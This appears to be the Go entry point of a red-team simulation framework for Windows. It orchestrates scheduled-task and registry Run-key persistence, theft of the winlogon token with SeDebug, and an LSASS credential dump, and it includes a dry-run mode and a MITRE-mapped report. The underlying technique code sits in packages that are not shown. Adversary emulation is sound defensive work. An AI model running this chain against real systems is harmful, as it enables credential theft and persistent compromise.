// cmd/sim is the reference entry point for the red-team simulation framework.
//
// It can be driven two ways:
//
//  1. Inline (code-defined phases):
//     sim.exe --payload C:\Temp\payload.exe --dump C:\Temp\lsass.dmp
//
//  2. YAML profile:
//     sim.exe --profile profiles/fin7.yaml
//
// Add --dry-run to print the execution plan without touching the system.
// The JSON report is written to --report (default: mitre_report.json).
//
// Build:
//
//	GOOS=windows GOARCH=amd64 go build -o sim.exe ./cmd/sim
package main

import (
	"flag"
	"log"
	"time"

	"github.com/rankin2000/golangexamples/pkg/creds"
	"github.com/rankin2000/golangexamples/pkg/persistence"
	"github.com/rankin2000/golangexamples/pkg/sim"
	"github.com/rankin2000/golangexamples/pkg/tokens"
	"github.com/rankin2000/golangexamples/profiles"
)

func main() {
	dryRun  := flag.Bool("dry-run", false, "print the execution plan without touching the system")
	profile := flag.String("profile", "", "path to a YAML simulation profile (overrides inline phases)")
	payload := flag.String("payload", `C:\Temp\payload.exe`, "payload path used by inline persistence phase")
	dump    := flag.String("dump", `C:\Temp\lsass.dmp`, "LSASS dump output path used by inline post-exploit phase")
	report  := flag.String("report", "mitre_report.json", "JSON report output path")
	flag.Parse()

	var s *sim.Sim

	if *profile != "" {
		var err error
		s, err = profiles.LoadProfile(*profile)
		if err != nil {
			log.Fatalf("[-] load profile: %v", err)
		}
		log.Printf("[+] loaded profile: %s", *profile)
	} else {
		// Inline two-phase sim: persistence → post-exploitation.
		// Adjust sleep durations and techniques to match the target TTP chain.
		s = sim.New().
			AddPhase("Persistence", 5*time.Second,
				&persistence.SchTask{
					PayloadPath: *payload,
					UseXML:      true,
				},
				&persistence.RegistryRunKey{
					Hive:        persistence.HKCU,
					PayloadPath: *payload,
				},
			).
			AddPhase("Post-Exploitation", 0,
				&tokens.Steal{
					TargetExe:     "winlogon.exe",
					SpawnExe:      `C:\Windows\System32\cmd.exe`,
					EnableSeDebug: true,
				},
				&creds.LSASSDump{
					OutputPath:    *dump,
					EnableSeDebug: true,
				},
			)
	}

	s.DryRun = *dryRun
	s.ReportPath = *report

	// Always print the plan so operators know what will run before it does.
	log.Println("[*] execution plan:")
	for _, line := range s.Plan() {
		log.Println("   ", line)
	}

	if err := s.Run(); err != nil {
		log.Fatalf("[-] sim: %v", err)
	}

	if !*dryRun {
		log.Printf("[+] report: %s", *report)
	}
}
